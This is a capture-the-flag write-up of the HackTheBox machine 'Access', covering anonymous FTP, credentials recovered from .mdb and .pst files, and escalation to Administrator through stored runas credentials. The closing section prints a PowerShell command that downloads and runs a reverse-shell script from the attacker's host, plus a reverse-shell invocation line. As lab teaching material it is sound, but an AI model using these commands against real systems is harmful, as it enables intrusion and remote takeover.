---
title: "HackTheBox Writeup: Access"
date: 2019-09-16T22:02:16+02:00
showdate: true
toc: true
tags:
 - hackthebox
 - ctf
 - writeup
---

{{%summary%}}
![img](/images/writeup-access/1.png)
{{%/summary%}}

Despite this box being rather easy it can teach a couple important lessons to people new to Windows CTF's / hacking: how to open .mdb and .pst files, which can contain very interesting info, and how to look for stored credentials to then use them with the *runas* utility to execute commands as other users, which is exactly how users are supposed to escalate their privileges to Administrator in this box, after logging in via Telnet thanks to the credentials found in an email contained in a .pst file extracted from a password protected .zip archive.
If you have already read one or more of my previous posts you will notice that this is the first box where I used Windows, even if I had originally used Kali to complete the box before it got retired, this was one of my very first boxes and I had very poor note taking practices back then, so I am re-doing all of them from scratch to take proper notes, and due to current technical limitations I am forced to use Windows at the moment, however at least for this challenge there is no difference in the tools or techniques used.

---

## Drawing the perimeter

An initial nmap scan doesn't return many ports to examine, but those few are all quite useful, if anything on this box it's very easy to know where to look without wasting time in rabbit holes:

```shell-session
C:\Users\Giulio\Desktop\htb\access
λ nmap -sV -sC -oA nmap 10.10.10.98
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-16 16:09 ora legale Europa occidentale
Nmap scan report for 10.10.10.98
Host is up (0.018s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.74 seconds
```

One of the first things I always check is the web server, and this instance of IIS only shows the picture of a server room:

![img](/images/writeup-access/2.png)

 It doesn't hide anything in the source code and a gobuster scan can't find any hidden content either:

```shell-session
C:\Users\Giulio\Desktop\htb\access                                                                   
λ gobuster -w C:\Tools\SecLists\Discovery\Web-Content\common.txt -u http://10.10.10.98 -o gobuster   
                                                                                                     
=====================================================                                                
Gobuster v2.0.1              OJ Reeves (@TheColonial)                                                
=====================================================                                                
[+] Mode         : dir                                                                               
[+] Url/Domain   : http://10.10.10.98/                                                               
[+] Threads      : 10                                                                                
[+] Wordlist     : C:\Tools\SecLists\Discovery\Web-Content\common.txt                                
[+] Status codes : 200,204,301,302,307,403                                                           
[+] Timeout      : 10s                                                                               
=====================================================                                                
2019/09/16 18:32:34 Starting gobuster                                                                
=====================================================                                                
/aspnet_client (Status: 301)                                                                         
/index.html (Status: 200).19%)                                                                       
=====================================================                                                
2019/09/16 18:32:45 Finished                                                                         
=====================================================                                                
```

FTP has anonymous login enabled, I found two different folders in it, Backup and Engineer, each of which containing one file, Backup.mdb and Access Control.zip, I have downloaded both on my computer to take a closer a look:

```shell-session
C:\Users\Giulio\Desktop\htb\access
λ ftp 10.10.10.98
Connesso a 10.10.10.98.
220 Microsoft FTP Service
Utente (10.10.10.98:(none)): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp: 97 bytes received in 0,00secondi 97000,00Kbyte/sec)
ftp> dir backups
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp: 51 bytes received in 0,00secondi 51000,00Kbyte/sec)
ftp> dir engineer
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp: 59 bytes received in 0,00secondi 59000,00Kbyte/sec)
```

The .zip file is password protected and a few basic attempts with easily guessable passwords did not work, and before attempting a dictionary attack I decided to take a look at the other file first:

![img](/images/writeup-access/3.png)

.mdb files are databases created with Microsoft Access (hence the name of the box I guess?) and instead of downloading a third party program or Access itself to open the file I headed over to [mdbopener](https://www.mdbopener.com/), which allows you to navigate mdb files straight from the web application. This database holds many different tables, and even if most are empty you might need a couple minutes to sift through the uninteresting ones until you see one called "auth user", where three user/password credentials are stored:

![img](/images/writeup-access/4.png)

None of these work through Telnet, but engineer's password worked on the password protected .zip file, so I could extract the .pst file seen above. PST stands for Personal Storage Table and these files are used to store messages in a variety of different programs, mainly Microsoft Outlook. Once again I resorted to a free web application, [GoldFynch's PST Viewer](https://goldfynch.com/pst-viewer/), to see the content of the file. In this case, it contains only a single email:

![img](/images/writeup-access/5.png)

The email contains the password for the *security* account, so now I can access the box via Telnet:

```shell-session
User: security
Pass: 4Cc3ssC0ntr0ller
```

---

## Logging in and local enumeration

Once logged in with the security account I find the first flag:

```shell-session
*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>dir desktop
Volume in drive C has no label.
Volume Serial Number is 9C45-DBF0


Directory of C:\Users\security\desktop


08/28/2018  07:51 AM    <DIR>          .
08/28/2018  07:51 AM    <DIR>          ..
08/21/2018  11:37 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  16,772,317,184 bytes free
```

With *net users* I listed the local users on the box, finding out that effectively the *engineer* account exists, but its only purpose for this challenge was using the password found in the .mdb database to unlock the archive:

```shell-session
C:\Users\security>net users                                                    
                                                                               
User accounts for \\ACCESS                                                     
                                                                               
-------------------------------------------------------------------------------
Administrator            engineer                 Guest                        
security                                                                       
The command completed successfully.                                            
```

There are no interesting processes running and nothing seems to stand out by taking a look at the files around the disk, so I run a few local enumeration commands to see if anything would catch my eye, the only command that did return something very useful was listing for stored cmdkey credentials:

```shell-session
C:\Users\security>cmdkey /list


Currently stored credentials:


    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

---

## Privilege escalation: abusing runas stored credentials

Even if the cleartext password cannot be obtained Windows can use this saved credentials entry to execute programs as the Administrator user without the need of asking others for the administrator password every time, this can be achieved with the *runas* utility, which has the following syntax:

```shell-session
Execute a program under a different user account (non-elevated).
Syntax
      RUNAS [ [/noprofile | /profile] [/env] [/savecred | /netonly] ] /user:UserName program
[...]
   /savecred        Use credentials previously saved by the user.
                    This option is not available on Windows 7 Home or
                    Starter Editions and will be ignored.
```

Since I need the /savecred flag to use those stored credentials and it appears to be ignored in Windows 7 Home and Started Editions I run *systeminfo* just to make sure the box wasn't running any of these two and luckily it was the case:

```shell-session
Host Name:                 ACCESS
OS Name:                   Microsoft Windows Server 2008 R2 Standard
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
```

With this knowledge we can come up with a command to read the root flag. Since *runas* will open a completely new process we wouldn't be able to just get the flag from stdout, so a possibility is redirecting the output of the *more* command to a file in a directory that the Security user can access, like its own desktop:

```shell-session
runas /savecred /user:access\administrator "cmd /c more c:\users\administrator\desktop\root.txt >> c:\users\security\desktop\out_test.txt"
```

That would already be enough to complete the challenge and call it a day, but in case you weren't satisfied with just grabbing the flag and actually wanted an Administrator shell the approach is very similar, instead of running cmd I run PowerShell and used the WebClient.downloadString method to make it download a Nishang Invoke-PowerShellTcp reverse shell I hosted on my box. Here is the resulting command:

```shell-session
runas /savecred /user:access\administrator "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.37:8000/access.ps1')"
```

To make sure that the reverse shell would launch automatically I added this line at the end of the script:

```shell-session
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 9999
```

The .ps1 script is executed automatically and returned me a shell as Administrator:

![img](/images/writeup-access/6.png)

This ends up the challenge, making it a quite fun one, definitely a nice beginner's choice for people still not too familiar with Windows.